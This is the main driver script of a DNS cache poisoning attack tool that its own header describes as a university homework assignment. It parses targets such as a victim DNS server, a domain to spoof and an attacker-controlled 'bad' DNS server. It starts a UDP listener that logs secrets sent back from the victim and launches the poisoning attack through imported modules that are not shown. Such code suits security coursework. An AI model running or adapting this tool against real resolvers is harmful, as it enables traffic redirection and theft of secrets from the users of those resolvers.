#! /usr/bin/env python3
    
## @package Main
#   This package is responsible to execute all the passages required for the attack related to our ETH homework.
#

##      @file main
#

import dns.resolver
from dns.resolver import NoAnswer

import socket
import sys
import signal
import argparse


from blessings import Terminal #For terminal threading

from threading import Thread

from dns_poisoning import DNSPoisoning
from dns_attack import DNSAttack


#Globals
secret_fetch_flag = True        #Used to stop the secret fetcher
custom_verbosity = 0
max_verbosity = 4
term = None
attack_pool = None
secret_socket = None
stop = False
use_colors = True

log_file = "log_secret.txt"

## Logging function
#
#   @brief The fuction used for output messages
#   @param msg The message to display
#   Verbosity can be set in order to suppres the output
#
def log(msg, verbosity=1):
    if verbosity < custom_verbosity:
        if use_colors:
                print(msg.format(t=term))
        else:
                print(msg.lstrip("{.*?}"))
        

def sigint_handler(sig, frame):
    import time

    global secret_fetch_flag
    log("Stopping secret fetcher thread...")
    secret_fetch_flag = False
    if secret_socket != None:
            secret_socket.close()
    time.sleep(1)
    #signal.signal(signal.SIGINT, sys.exit(0))
    log("Stopping all the attacks...")
    print("Exiting...")
    sys.exit(0)

##
#       @brief Routine that fetch the secret
#
#       Start a small UDP server which listen on the provided port for the secrets.\n
#       It also write the secrets into the log_file file.
#
def secret_fetcher(server_ip, server_port):
    global stop

    try:
        secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
        secret_socket.bind((server_ip, server_port))
    except:
        log("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!")
        log("Attack may be successful but no secret will be received...")

    file_secret = None
    try:
        file_secret = open(log_file, "a+")
    except:
        log("{t.bold}{t.red}Unable to open log file{t.normal}!!!!")

    log("({t.bold}secret fetcher{t.normal}) Listening on " + str(server_ip) + ":" + str(server_port) + " for incoming message...")

    while secret_fetch_flag:
        try:
                data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
                log("({t.bold}secret fetcher{t.normal})Received response: \n\t" + str(data))
                stop = True
                file_secret.write("Secret fetched: " + str(data))
        except:
                log("Error During secret fetching, exiting")
                return
                
##
#       @brief The routine that lauches the attack
#       @param victim_server_ip         The target server IP
#       @param domain                   The domain to spoof
#
def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip,\
         number_of_tries=None, victim_mac=None, nic_interface=None, attack_type=None):

        attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                 attacker_ip, victim_mac=victim_mac, nic_interface=nic_interface,\
                sigint_handler=sigint_handler, log_function=log)

        if number_of_tries == None:
                number_of_tries=50

        attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 

def validate_parameters(params):
        global use_colors, term, custom_verbosity


        if not check_ip(params["attacker_ip"]):
                print("Invalid Attacker IP")
                return False
        if not check_ip(params["victim_dns_ip"]):
                print("Invalid Victim DNS IP")
                return False
        if not check_domain(params["domain"]):
                print("Invalid Target Domain")
                return False        
        if not check_ip(params["bad_server_ip"]):
                print("Invalid Bad Server IP")
                return False
        if not check_port(params["bad_server_port"]):
                print("Invalid Bad Server port")
                return False
        if not check_ip(params["ns_server"]):
                print("Invalid NS Server IP")
                return False
        if not check_ip(params["secret_ip"]):
                print("Invalid secret fetcher IP")
                return False
        if not check_port(params["secret_port"]):
                print("Invalid secret fetcher port")
                return False


        if params is False:
                print("Parameter error, exiting...")
                return 
        if params['no_colors']:
                use_colors = False   
        else:
                term=Terminal()
        if params['verbosity'] is not None:
                custom_verbosity = max_verbosity - int(params['verbosity'])

        return True

def fetch_parameter(*args):
        parser = argparse.ArgumentParser(description='DNS Poisoning Attack Tool')
        parser.add_argument('-t', '--target-domain', dest='domain', help='The target domain to spoof', required=True, type=str)
        parser.add_argument('-a', '--attacker-ip', help='Attacker IP address', required=True, type=str)
        parser.add_argument('-v', '--victim-dns-ip', help='The victim DNS IP address', required=True, type=str)

        parser.add_argument('-bs', '--bad-server-ip', dest='bad_server_ip', help='The Bad Guy DNS server IP', required=False, type=str, default='192.168.56.1')
        parser.add_argument('-bp', '--bad-server-port', dest='bad_server_port', help='The Bad Guy DNS server port', required=False, type=int, default=55553)
        parser.add_argument('-ns', '--ns-server', dest='ns_server', help='The victim authoritative server', required=False, type=str)
        parser.add_argument('-i', '--interface', dest='interface', help='The Network Card interface to use', required=False, type=str)

        parser.add_argument('-at', '--attack-type', dest='attack_type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str, default='NORMAL')
        parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
       
        parser.add_argument('-vm', '--victim-mac', dest='victim_mac', help='The victim MAC address', required=False, type=str)

        parser.add_argument('-si', '--secret-ip', dest='secret_ip', help='IP to bind for the secret fetcher', required=False, type=str, default="0.0.0.0")
        parser.add_argument('-sp', '--secret-port', dest='secret_port', help='Port to bind for the secret fetcher', required=False, type=int, default=1337)

        parser.add_argument('-nc', '--no-colors', dest='no_colors', help='Suppress coloured terminal output', required=False, action='store_true')
        parser.add_argument('-vb', '--verbosity', dest='verbosity', help='Verbosity level', required=False, choices=['1', '2','3','4'])


        args = parser.parse_args()

        if args.mode == "FAST" and (args.victim_mac is None and args.interface is None):
                parser.error("FAST Mode require both victim MAC address and network interface")
                

        if validate_parameters(vars(args)):
                return vars(args)
        else:
                return False

##
#       @brief Check if the passed IP address is valid
#       @param The IP address to check
#       @return True if is valid, False otherwise
#
def check_ip(ip):
        import ipaddress
        
        try:
                ipaddress.ip_address(ip)
        except:
                return False
        else:
                return True

##
#       @brief Check if a domain is valid
#       Tries to resolve the domain in order to check if it is valid or not
#       
#       @param domain   The domain to check
#
#       @bug Cannot specify which nameserver should be used
def check_domain(domain):
        return True
        #try:
        #        socket.gethostbyname(domain.strip())
        #except socket.gaierror:
        #        print("Unable to get address for " + str(domain))
        #        return False
        #return True


def check_port(port):
        if port < 0 or port > 65535:
                return False
        return True

def main(*args):

        param = fetch_parameter(*args)

        log("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n")


        victim_server_ip = param['victim_dns_ip']
        attacker_ip = param['attacker_ip']
        domain = param['domain']
        
        #Bad Guy
        bad_server = (param['bad_server_ip'], param['bad_server_port'])

        secret_ip = param['secret_ip']
        secret_port = param['secret_port']

        victim_mac = param['victim_mac']
        nic_interface = param['interface']

        # @todo add the attack type
        attack_type = param['attack_type']



        #Launch the secret fetcher
        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port),daemon=True)
        secret_thread.start()

        try:

                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30,\
                         victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface)

        except DNSAttack.CriticalError:
                log("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating")
        except DNSAttack.SuccessfulAttack:
                log("\n\n{t.green}{t.bold}Attack Successully executed{t.normal}")
        finally:
                log("Exiting...")




if __name__ == '__main__':
        main(*sys.argv[1:])